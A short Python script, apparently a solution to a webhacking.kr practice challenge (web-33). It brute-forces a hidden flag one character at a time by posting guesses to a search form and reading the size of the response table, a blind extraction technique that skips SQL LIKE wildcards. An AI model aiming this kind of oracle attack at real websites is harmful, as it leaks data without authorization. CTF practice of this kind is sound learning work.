import requests,copy,time
from bs4 import BeautifulSoup

#32~126 까지 돌려
def valid(html):
    chose = BeautifulSoup(html, 'lxml').select_one('body > center > table')
    #print(chose.get_text)
    print(len(chose.contents))
    if len(chose.contents) > 3:
        return True
    return False

def send(string):
    URL = 'https://webhacking.kr/challenge/web-33/index.php'
    data = {'search':string}
    print(string)
    res = requests.post(url=URL, data=data)
    if res.status_code != 200:
        return False
    return res.text
def toString(string):
    comp =""
    for i in string:
        comp += i
    return comp


if __name__ == '__main__':
    scheme = 'flag{%s}'
    sch = 'H I M I K O _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _'.split()
    ban = [95, 37]
    count = 6
    ch = 32
    while(count < len(sch)):
        while (ch < 133):
            if ch in ban:
                print('ban')
                ch += 1
                continue
            
            sch[count] = chr(ch)
            if valid(send(scheme % toString(sch))):
                print('Find: %s' % toString(sch))
                break
            
            ch += 1
            time.sleep(0.01)
        if ch == 133:
            sch[count] = '_'
        ch = 32
        count += 1
